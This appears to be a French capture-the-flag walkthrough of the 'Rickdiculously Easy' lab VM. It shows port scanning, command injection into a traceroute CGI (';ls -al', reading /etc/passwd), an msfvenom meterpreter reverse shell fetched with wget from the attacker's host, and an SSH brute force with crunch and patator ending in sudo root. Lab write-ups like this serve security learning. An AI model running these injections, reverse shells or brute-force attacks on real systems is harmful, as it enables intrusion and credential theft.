---
layout: post
title: Rickdiculously Easy 
---

![pwn]({{ site.baseurl }}/images/kiopitrix-1-1/pwn.jpeg){:class="img-responsive"}

## Énumération 

Avec Nmap on trouve ceci : 
```bash
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-03 19:03 CET
Nmap scan report for 192.168.122.122
Host is up (0.0012s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
9090/tcp  open  zeus-admin
13337/tcp open  unknown
22222/tcp open  easyengine
60000/tcp open  unknown
MAC Address: 52:54:00:8B:22:12 (QEMU virtual NIC)

```
On trouve donc : 
- Un FTP qui permet les connexions anonymes **21** 
- Un serveur Http qui sert un site web **80**
- Un port ssh **22**
- Une interface d'administration **9090**
- Des ports inconnus **13337,22222,60000**

## FTP 

Concentrons nous sur le FTP avec Netcat, ici on va utiliser le mode passif et donc deux consoles. 

Sur la console 1:
```bash
root@kali:~# netcat 192.168.122.122 21
220 (vsFTPd 3.0.3)
retr
530 Please login with USER and PASS.
USER anonymous
331 Please specify the password.
PASS ff
230 Login successful.
PASV
227 Entering Passive Mode (192,168,122,122,169,77).
LIST
150 Here comes the directory listing.
226 Directory send OK.
PASV
227 Entering Passive Mode (192,168,122,122,85,78).
RETR FLAG.txt
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
226 Transfer complete.

```

Console 2 :

```bash
root@kali:~# nc -v 192.168.122.122 43341
192.168.122.122: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.122.122] 43341 (?) open
HELP
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
root@kali:~# nc -v 192.168.122.122 21838
192.168.122.122: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.122.122] 21838 (?) open
FLAG{Whoa this is unexpected} - 10 Points
```

*** Premier FLAG ! 10/130 points ***

## Port 13337 

Utilisons Telnet pour identifier ce qui tourne derrière ce port : 

```bash
root@kali:~# telnet 192.168.122.122 13337
Trying 192.168.122.122...
Connected to 192.168.122.122.
Escape character is '^]'.
FLAG:{TheyFoundMyBackDoorMorty}-10Points
Connection closed by foreign host.
``` 

*** Deuxième FLAG 20/130 points ***

## Port 60000

```bash
telnet 192.168.122.122 60000                                            1 ↵
Trying 192.168.122.122...
Connected to 192.168.122.122.
Escape character is '^]'.
Welcome to Ricks half baked reverse shell...
# pwd
/root/blackhole/ 
# ls
FLAG.txt 
# cat FLAG.txt 
FLAG{Flip the pickle Morty!} - 10 Points
```

*** Troisième FLAG 30/130 points ***

## Port 9090

En ouvrant un navigateur sur ce port on obtiens un flag : 

```bash
FLAG {There is no Zeus, in your face!} - 10 Points
```

*** Quatrième FLAG 40/130 ***

## HTTP 

Sur le port HTTP on va lancer dirb pour trouver d'éventuels indices ou pages cache :

```bash
root@kali:~# dirb http://192.168.122.122/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 24 09:00:52 2018
URL_BASE: http://192.168.122.122/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.122.122/ ----
+ http://192.168.122.122/cgi-bin/ (CODE:403|SIZE:217)                          
+ http://192.168.122.122/index.html (CODE:200|SIZE:326)                        
==> DIRECTORY: http://192.168.122.122/passwords/                               
+ http://192.168.122.122/robots.txt (CODE:200|SIZE:126)                        
                                                                               
---- Entering directory: http://192.168.122.122/passwords/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Feb 24 09:00:58 2018
DOWNLOADED: 4612 - FOUND: 3
```

On trouve ici de jolies choses : 
- passwords
- robots.txt

### Passwords 

Utilisons Lynx pour voir ce qui se trouve dans le dossier passwords (et si il est lisible) 

```bash
                                       Index of /passwords

   [ICO] Name Last modified Size Description
     ___________________________________________________________________________________

   [PARENTDIR] Parent Directory   -
   [TXT] FLAG.txt 2017-08-22 02:31 44
   [TXT] passwords.html 2017-08-23 19:51 352
     ___________________________________________________________________________________


←←←
FLAG{Yeah d- just don't do it.} - 10 Points

```

*** Cinquième FLAG 50/130 ***

Si on ouvrais le fichier HTML ? 

```html
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```

On trouve ici un commentaire contenant un mot de passe : **winter**
Mettons le de côté. 

### Robots.txt

Si nous allions voir le fichier robots.txt ? 

```bash
root@kali:~# curl http://192.168.122.122/robots.txt
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

Testons :
- root_shell.cgi est en construction.
- tracertool.cgi nous retourne une application qui fait des traceroute. 

#### root_shell.cgi

Examinons le contenu du code source : 

```html

<html><head><title>Root Shell
</title></head>
--UNDER CONSTRUCTION--
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.-->
</html>

```

On trouve ici un commentaire de Rick pour nous troller...

#### tracertool.cgi

Ici on est vraisemblablement face à une application qui exploite une commande bash. 
Tentons une injection en lui envoyant `;ls -al`, si on obtiens une sortie valide cela signifie qu'il est possible d'injecter des commandes Bash :

```
total 8
drwxr-xr-x. 2 root root  50 Aug 25  2017 .
drwxr-xr-x. 4 root root  33 Aug 22  2017 ..
-rwxr-xr-x. 1 root root 255 Aug 22  2017 root_shell.cgi
-rwxr-xr-x. 1 root root 787 Aug 25  2017 tracertool.cgi
```

Bingo ! On va pouvoir injecter une backdoor la dedans :

```bash
#Generating reverse shell 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.122.197 LPORT=4444 -f elf > shell.elf
#Launch simple HTTP server for upload
python -m SimpleHTTPServer 8000
#Upload (on target)
;wget http://192.168.122.197/shell.elf -o /tmp/shell.elf
#Launch meterpreter listener
use exploit/multi/handler
set payload linux/x86/meterpreter_reverse_tcp
#Launch shell on target
; /tmp/shell.elf
```

C'est ici une échec cuisant, tentons autre chose : 

```bash
;cat /etc/password 

                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

``` 

Encore un troll de Rick, on change donc de technique : 

```bash
; head -n56 /etc/passwd

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

## Port 22222

On va simplement tenter des connexions SSH sur ces utilisateurs :

```bash

root@kali:~# ssh Morty@192.168.122.122 -p 22222
Morty@192.168.122.122's password: 
Permission denied, please try again.
Morty@192.168.122.122's password: 

root@kali:~# ssh RickSanchez@192.168.122.122 -p 22222
RickSanchez@192.168.122.122's password: 
Permission denied, please try again.
RickSanchez@192.168.122.122's password: 

root@kali:~# ssh Summer@192.168.122.122 -p 22222
Summer@192.168.122.122's password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104

[Summer@localhost ~]$ head  FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points

```

*** Sixième FLAG 60/130 ***

On examine ensuite les autres dossier utilisateurs pour obtenir le maximum d'informations : 

```bash
/home/Morty:
total 64
drwxr-xr-x. 2 Morty Morty   131 15 sept. 11:49 .
drwxr-xr-x. 5 root  root     52 18 août   2017 ..
-rw-------. 1 Morty Morty     1 15 sept. 11:51 .bash_history
-rw-r--r--. 1 Morty Morty    18 30 mai    2017 .bash_logout
-rw-r--r--. 1 Morty Morty   193 30 mai    2017 .bash_profile
-rw-r--r--. 1 Morty Morty   231 30 mai    2017 .bashrc
-rw-r--r--. 1 root  root    414 22 août   2017 journal.txt.zip
-rw-r--r--. 1 root  root  43145 22 août   2017 Safe_Password.jpg

/home/RickSanchez:
total 12
drwxr-xr-x. 4 RickSanchez RickSanchez 113 21 sept. 10:30 .
drwxr-xr-x. 5 root        root         52 18 août   2017 ..
-rw-r--r--. 1 RickSanchez RickSanchez  18 30 mai    2017 .bash_logout
-rw-r--r--. 1 RickSanchez RickSanchez 193 30 mai    2017 .bash_profile
-rw-r--r--. 1 RickSanchez RickSanchez 231 30 mai    2017 .bashrc
drwxr-xr-x. 2 RickSanchez RickSanchez  18 21 sept. 09:50 RICKS_SAFE
drwxrwxr-x. 2 RickSanchez RickSanchez  26 18 août   2017 ThisDoesntContainAnyFlags

/home/Summer:
total 20
drwx------. 2 Summer Summer  99 15 sept. 11:49 .
drwxr-xr-x. 5 root   root    52 18 août   2017 ..
-rw-------. 1 Summer Summer 766  5 mars  05:32 .bash_history
-rw-r--r--. 1 Summer Summer  18 30 mai    2017 .bash_logout
-rw-r--r--. 1 Summer Summer 193 30 mai    2017 .bash_profile
-rw-r--r--. 1 Summer Summer 231 30 mai    2017 .bashrc
-rw-rw-r--. 1 Summer Summer  48 22 août   2017 FLAG.txt
```

Dans le dossier home de Morty, on trouve un fichier ```Safe_Password.jpg```. 
En l'ouvrant on obtiens une simple image de Rick ; vraisemblablement de la stéganographie : 

```bash
xxd Safe_Password.jpg | less 

1 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0060  ......JFIF.....`
   2 00000010: 0060 0000 ffe1 008c 4578 6966 0000 4d4d  .`......Exif..MM
   3 00000020: 002a 0000 0008 0005 0112 0003 0000 0001  .*..............
   4 00000030: 0001 0000 011a 0005 0000 0001 0000 004a  ...............J
   5 00000040: 011b 0005 0000 0001 0000 0052 0128 0003  ...........R.(..
   6 00000050: 0000 0001 0002 0000 8769 0004 0000 0001  .........i......
   7 00000060: 0000 005a 0000 0000 0000 0060 0000 0001  ...Z.......`....
   8 00000070: 0000 0060 0000 0001 0003 a001 0003 0000  ...`............
   9 00000080: 0001 0001 0000 a002 0004 0000 0001 0000  ................
  10 00000090: 0350 a003 0004 0000 0001 0000 0438 0000  .P...........8..
  11 000000a0: 0000 ffed 0038 2054 6865 2053 6166 6520  .....8 The Safe
  12 000000b0: 5061 7373 776f 7264 3a20 4669 6c65 3a20  Password: File: 
  13 000000c0: 2f68 6f6d 652f 4d6f 7274 792f 6a6f 7572  /home/Morty/jour
  14 000000d0: 6e61 6c2e 7478 742e 7a69 702e 2050 6173  nal.txt.zip. Pas
  15 000000e0: 7377 6f72 643a 204d 6565 7365 656b 0038  sword: Meeseek.8
  16 000000f0: 4249 4d04 0400 0000 0000 0038 4249 4d04  BIM........8BIM.
  17 00000100: 2500 0000 0000 10d4 1d8c d98f 00b2 04e9  %...............
  18 00000110: 8009 98ec f842 7eff c000 1108 0438 0350  .....B~......8.P
  19 00000120: 0301 2200 0211 0103 1101 ffc4 001f 0000  ..".............
  20 00000130: 0105 0101 0101 0101 0000 0000 0000 0000  ................
  21 00000140: 0102 0304 0506 0708 090a 0bff c400 b510  ................
  22 00000150: 0002 0103 0302 0403 0505 0404 0000 017d  ...............}
  23 00000160: 0102 0300 0411 0512 2131 4106 1351 6107  ........!1A..Qa.
  24 00000170: 2271 1432 8191 a108 2342 b1c1 1552 d1f0  "q.2....#B...R..
  25 00000180: 2433 6272 8209 0a16 1718 191a 2526 2728  $3br........%&'(
```

On trouve ainsi la phrase ``` The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek ```.

Mettons ça de coté et allons voir ce fameux ```/home/Morty/journal.txt.zip``` :

```bash
root@kali:~/Téléchargements# unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt             
root@kali:~/Téléchargements# cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points 
```

*** Septième FLAG 80/130 ***

On lit visiblement ici que Morty nous fournit un mot de passe pour un coffre-fort.
Plus haut on à vus que dans le dossier home de Rick se trouve un dossier ```RICKS_SAFE``` :

```bash
[Summer@localhost ~]$ ls /home/RickSanchez/
RICKS_SAFE  ThisDoesntContainAnyFlags
[Summer@localhost ~]$ ls -al /home/RickSanchez/RICKS_SAFE/
total 12
drwxr-xr-x. 2 RickSanchez RickSanchez   18 21 sept. 09:50 .
drwxr-xr-x. 4 RickSanchez RickSanchez  113 21 sept. 10:30 ..
-rwxr--r--. 1 RickSanchez RickSanchez 8704 21 sept. 10:24 safe
```

Visiblement, on ne peut pas exécuter ce programme, on va donc utiliser une technique d'exfiltration : 

```bash
# Sur la cible 
[Summer@localhost ~]$ cd /home/RickSanchez/
RICKS_SAFE/                ThisDoesntContainAnyFlags/ 
[Summer@localhost ~]$ cd /home/RickSanchez/RICKS_SAFE/
[Summer@localhost RICKS_SAFE]$ ls
safe
[Summer@localhost RICKS_SAFE]$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
# Sur notre kali
root@kali:~/Téléchargements# wget http://192.168.122.122:8080/safe
```

On va maintenant faire le contraire :

```bash
# Sur notre Kali
root@kali:~/Téléchargements# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...

# [Summer@localhost ~]$ wget http://192.168.122.197:8080/safe
--2018-03-06 20:22:40--  http://192.168.122.197:8080/safe
Connexion à 192.168.122.197:8080… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 8704 (8,5K) [application/octet-stream]
Sauvegarde en : « safe.1 »

safe                   100%[===============================>]   8,50K  --.-KB/s    ds 0s      

2018-03-06 20:22:40 (21,0 MB/s) — « safe.1 » sauvegardé [8704/8704]
```

On va maintenant tenter de le lancer :

```bash
[Summer@localhost ~]$ chmod +x safe
[Summer@localhost ~]$ ./safe 
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
[Summer@localhost ~]$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.  @
```

*** Huitième FLAG 100/130 ***

On va donc ici générer un dictionnaire de mot de passe avec cruncher : 

```bash
root@kali:~# crunch 7 7 -t ,%Flesh >> rick-list.txt
root@kali:~# crunch 10 10 -t ,%Curtains >> rick-list.txt
```

On à donc : 
- Nombre mini de caractères 
- Nombre maxi de caractères
- **-t** pour spécifier une chaîne un peut à la Sprintf
- **,** pour une lettre majuscule
- **%** pour un digit
- Une chaîne avec les mots Flesh et Curtains (Je vous laisse chercher sur google)

Maintenant patatons ! 

```bash
root@kali:~# patator ssh_login host=192.168.122.122 port=22222 user=RickSanchez password=FILE0 0=rick-list.txt -x ignore:mesg='Authentication failed.'

11:18:17 patator    INFO - 0     19    0.165 | P7Curtains                         |  1198 | SSH-2.0-OpenSSH_7.5
```

On à donc trouver le mot de passe de Rick **P7Curtains** :

```bash
[Summer@localhost ~]$ su RickSanchez
Mot de passe : 
[RickSanchez@localhost Summer]$ whoami 
RickSanchez
```

On test si on à des droits sudo : 

```bash
[RickSanchez@localhost Summer]$ sudo -l
[sudo] Mot de passe de RickSanchez : 
Entrées par défaut pour RickSanchez sur localhost :
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

L'utilisateur RickSanchez peut utiliser les commandes suivantes sur localhost :
    (ALL) ALL
```

On y est presque : 

```bash
[RickSanchez@localhost Summer]$ sudo -s
[root@localhost Summer]# head FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
```

*** Neuvième FLAG 130/130 ***

Nous voici en présence de tous les flags du challenge.
